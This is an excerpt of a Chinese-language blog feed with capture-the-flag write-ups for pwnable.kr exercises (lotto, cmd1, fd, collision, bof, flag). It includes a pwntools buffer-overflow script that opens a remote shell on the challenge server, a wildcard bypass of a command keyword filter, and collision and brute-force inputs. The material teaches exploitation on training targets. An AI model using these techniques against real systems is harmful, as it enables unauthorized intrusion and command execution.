class="comment">// End Function</span></div></pre></td></tr></table></figure>
<p>看了下注的代码后，发现一个漏洞，可以下任意大小的筹码（不要溢出了= =）。然后只要赢一次就好了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">YaY_I_AM_A_MILLIONARE_LOL</div><div class="line"></div><div class="line"></div><div class="line">Cash: <span class="variable">$100000500</span></div><div class="line">-------</div><div class="line">|D    |</div><div class="line">|  1  |</div><div class="line">|    D|</div><div class="line">-------</div><div class="line"></div><div class="line">Your Total is 1</div><div class="line"></div><div class="line">The Dealer Has a Total of 10</div><div class="line"></div><div class="line">Enter Bet: $</div></pre></td></tr></table></figure>
<h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> r;</div><div class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</div><div class="line">    <span class="comment">//sleep(1);</span></div><div class="line"></div><div class="line">    <span class="comment">// generate lotto numbers</span></div><div class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</div><div class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</div><div class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;     <span class="comment">// 1 ~ 45</span></div><div class="line">    &#125;</div><div class="line">    close(fd);</div><div class="line">    </div><div class="line">    <span class="comment">// calculate lotto score</span></div><div class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</div><div class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</div><div class="line">                match++;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// win!</span></div><div class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// menu</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</div><div class="line"></div><div class="line">        <span class="keyword">switch</span>(menu)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                play();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                help();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>只需要让<strong>match == 6</strong>即可</p>
<p>这一句是将ascii转换到ascii 1-45之间<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">    lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这块正是漏洞所在，<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</div><div class="line">        <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</div><div class="line">            match++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>无法控制lotto的值，可以控制submit的值，但是submit可以相同。所以就暴力破解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Submit your 6 lotto bytes : !!!!!!</div><div class="line">Lotto Start!</div><div class="line">sorry mom... I FORGOT to check duplicate numbers... :(</div><div class="line">- Select Menu -</div><div class="line">1. Play Lotto</div><div class="line">2. Help</div><div class="line">3. Exit</div></pre></td></tr></table></figure>
<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</div><div class="line">    putenv(<span class="string">"PATH=/fuckyouverymuch"</span>);</div><div class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    system( argv[<span class="number">1</span>] );</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看出，system的参数过滤了<em>flag</em>,<em>sh</em>,<em>tmp</em>。不过linux可以使用通配符<em>flag</em>换成<em>f*</em>即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">cmd1@ubuntu:~$ ./cmd1 <span class="string">"/bin/cat f*"</span></div><div class="line">mommy now I get what PATH environment is <span class="keyword">for</span> :)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;p&gt;以下是solution的目录&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mistake&quot; title=&quot;mistake&quot;&gt;#mistake&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#shellshock&quot; title=&quot;shellshock&quot;&gt;#shellshock&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#coin1&quot; title=&quot;coin1&quot;&gt;#coin1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#blackjack&quot; title=&quot;blackjack&quot;&gt;#blackjack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lotto&quot; title=&quot;lotto&quot;&gt;#lotto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cmd1&quot; title=&quot;cmd1&quot;&gt;#cmd1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Other&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/&quot; title=&quot;一些pwn题目的解题思路[pwnable.kr]&quot;&gt;一些pwn题目的解题思路[pwnable.kr]&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一些pwn题目的解题思路[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/"/>
    <id>http://weaponx.site/2017/02/13/一些pwn题目的解题思路-pwnable-kr/</id>
    <published>2017-02-13T15:55:00.000Z</published>
    <updated>2017-02-14T17:45:34.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>以下是solution的目录</p>
<ul>
<li><a href="#fd" title="fd">#fd</a></li>
<li><a href="#collision" title="collision">#collision</a></li>
<li><a href="#bof" title="bof">#bof</a></li>
<li><a href="#flag" title="flag">#flag</a></li>
<li><a href="#passcode" title="passcode">#passcode</a></li>
<li><a href="#random" title="random">#random</a></li>
</ul>
<p>Other</p>
<p><a href="http://weaponx.site/2017/02/14/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr-II/" title="一些pwn题目的解题思路[pwnable.kr] II">一些pwn题目的解题思路[pwnable.kr] II</a></p>
<a id="more"></a>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>根据题目描述，登录上服务器，ls一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">fd@ubuntu:~$ ls</div><div class="line">fd  fd.c  flag</div><div class="line">fd@ubuntu:~$ cat flag</div><div class="line">cat: flag: Permission denied</div></pre></td></tr></table></figure>
<p>肯定flag也不能直接读取，既然给了源代码，就顺便看一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">    len = read(fd, buf, <span class="number">32</span>);</div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这道题的考点就是<em>fd = 0</em>为linux下的标准输入。只要让<em>atoi(argv[1])-0x1234 = 0</em>即可，然后再输入<em>LETMEWIN</em>即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">fd@ubuntu:~$ ./fd 4660</div><div class="line">LETMEWIN</div><div class="line">good job :)</div><div class="line">mommy! I think I know what a file descriptor is!!</div></pre></td></tr></table></figure>
<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>给了题目的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</div><div class="line">        res += ip[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>逻辑很简单，把20个字符分成5组，每组四个。只要让5组的字符串的ascii加起来等于0x21DD09EC即可。</p>
<p>开始我的思路是分成0x21DD09EC和4组全0，但是过不了strlen的长度判断。只能变成四组0x01010101和一组0x1DD905E8。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">col@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; payload = p32(0x1dd905e8) + p32(0x01010101) * 4</div><div class="line">&gt;&gt;&gt; io = process([<span class="string">"./col"</span>, payload])</div><div class="line">[x] Starting <span class="built_in">local</span> process <span class="string">'./col'</span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./col'</span>: Done</div><div class="line">&gt;&gt;&gt; io.recv()</div><div class="line">[*] Process <span class="string">'./col'</span> stopped with <span class="built_in">exit</span> code 0</div><div class="line"><span class="string">'daddy! I just managed to create a hash collision :)\n'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">    gets(overflowme);   <span class="comment">// smash me!</span></div><div class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">        system(<span class="string">"/bin/sh"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    func(<span class="number">0xdeadbeef</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个典型的缓冲区溢出，只要把key覆盖没0xcafebabe即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EBX: 0xf7<span class="built_in">fc</span>3000 --&gt; 0x1a6da8 </div><div class="line">ECX: 0xfbad2288 </div><div class="line">EDX: 0xf7<span class="built_in">fc</span>48a4 --&gt; 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0xffffd668 (<span class="string">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">ESP: 0xffffd620 --&gt; 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EIP: 0x8048525 (&lt;func+40&gt;:  cmp    DWORD PTR [ebp+0x8],0xcafebabe)</div><div class="line">EFLAGS: 0x286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804851a &lt;func+29&gt;: lea    eax,[ebp-0x2c]</div><div class="line">   0x804851d &lt;func+32&gt;: mov    DWORD PTR [esp],eax</div><div class="line">   0x8048520 &lt;func+35&gt;: call   0x80483a0 &lt;gets@plt&gt;</div><div class="line">=&gt; 0x8048525 &lt;func+40&gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x804852c &lt;func+47&gt;: jne    0x804853c &lt;func+63&gt;</div><div class="line">   0x804852e &lt;func+49&gt;: mov    DWORD PTR [esp],0x804861f</div><div class="line">   0x8048535 &lt;func+56&gt;: call   0x80483d0 &lt;system@plt&gt;</div><div class="line">   0x804853a &lt;func+61&gt;: jmp    0x8048548 &lt;func+75&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd620 --&gt; 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0004| 0xffffd624 --&gt; 0x0 </div><div class="line">0008| 0xffffd628 --&gt; 0xc2 </div><div class="line">0012| 0xffffd62c --&gt; 0xf7eb0716 (<span class="built_in">test</span>   eax,eax)</div><div class="line">0016| 0xffffd630 --&gt; 0xffffffff </div><div class="line">0020| 0xffffd634 --&gt; 0xffffd65e (<span class="string">"AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0024| 0xffffd638 --&gt; 0xf7e28c34 --&gt; 0x2aad </div><div class="line">0028| 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">8       <span class="keyword">if</span>(key == 0xcafebabe)&#123;</div><div class="line">gdb-peda$ p <span class="variable">$ebp</span>+8</div><div class="line"><span class="variable">$1</span> = (void *) 0xffffd670</div><div class="line">gdb-peda$ x/20wx <span class="variable">$ebp</span>+8</div><div class="line">0xffffd670: 0x41474141  0x41416341  0x48414132  0x41644141</div><div class="line">0xffffd680: 0x41413341  0x65414149  0x41344141  0x41414a41</div><div class="line">0xffffd690: 0x35414166  0x414b4141  0x41416741  0x4c414136</div><div class="line">0xffffd6a0: 0x00000000  0xffffd724  0xffffd6c4  0x0804a024</div><div class="line">0xffffd6b0: 0x0804825c  0xf7<span class="built_in">fc</span>3000  0x00000000  0x00000000</div><div class="line">gdb-peda$ pattern_offset 0x41474141</div><div class="line">1095188801 found at offset: 52</div></pre></td></tr></table></figure>
<p>找到53-56个字节即可覆盖key。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9000</span>)</div><div class="line">payload = <span class="string">"a"</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>运行exploit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/3 » python exp.py</div><div class="line">[+] Opening connection to pwnable.kr on port 9000: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">bof</div><div class="line">bof.c</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">daddy, I just pwned a buFFer :)</div><div class="line">$</div></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>一看bin，是经过upx加壳的，直接用upx脱壳。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/4/upx-3.93-amd64_linux » ./upx <span class="_">-d</span> ../flag                                                            user@ubuntu</div><div class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</div><div class="line">                          Copyright (C) 1996 - 2017</div><div class="line">UPX 3.93        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 29th 2017</div><div class="line"></div><div class="line">        File size         Ratio      Format      Name</div><div class="line">   --------------------   ------   -----------   -----------</div><div class="line">    887219 &lt;-    335288   37.79%   linux/amd64   flag</div><div class="line"></div><div class="line">Unpacked 1 file.</div></pre></td></tr></table></figure>
<p>调试一下直接出flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x40118b &lt;main+39&gt;:  mov    rax,QWORD PTR [rbp-0x8]</div><div class="line">   0x40118f &lt;main+43&gt;:  mov    rsi,rdx</div><div class="line">   0x401192 &lt;main+46&gt;:  mov    rdi,rax</div><div class="line">=&gt; 0x401195 &lt;main+49&gt;:  call   0x400320</div><div class="line">   0x40119a &lt;main+54&gt;:  mov    eax,0x0</div><div class="line">   0x40119f &lt;main+59&gt;:  leave  </div><div class="line">   0x4011a0 &lt;main+60&gt;:  ret    </div><div class="line">   0x4011a1:    nop</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0x6c96b0 --&gt; 0x0 </div><div class="line">arg[1]: 0x496628 (<span class="string">"UPX...? sounds like a delivery service :)"</span>)</div><div class="line">arg[2]: 0x496628 (<span class="string">"UPX...? sounds like a delivery service :)"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe510 --&gt; 0x401a50 (&lt;__libc_csu_init&gt;:   push   r14)</div><div class="line">0008| 0x7fffffffe518 --&gt; 0x6c96b0 --&gt; 0x0 </div><div class="line">0016| 0x7fffffffe520 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffe528 --&gt; 0x401344 (&lt;__libc_start_main+404&gt;: mov    edi,eax)</div><div class="line">0032| 0x7fffffffe530 --&gt; 0x0 </div><div class="line">0040| 0x7fffffffe538 --&gt; 0x100000000 </div><div class="line">0048| 0x7fffffffe540 --&gt; 0x7fffffffe618 --&gt; 0x7fffffffe852 (<span class="string">"/home/user/pwn/pwnkr/4/flag"</span>)</div><div class="line">0056| 0x7fffffffe548 --&gt; 0x401164 (&lt;main&gt;:  push   rbp)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">0x0000000000401195 <span class="keyword">in</span> main ()</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure>
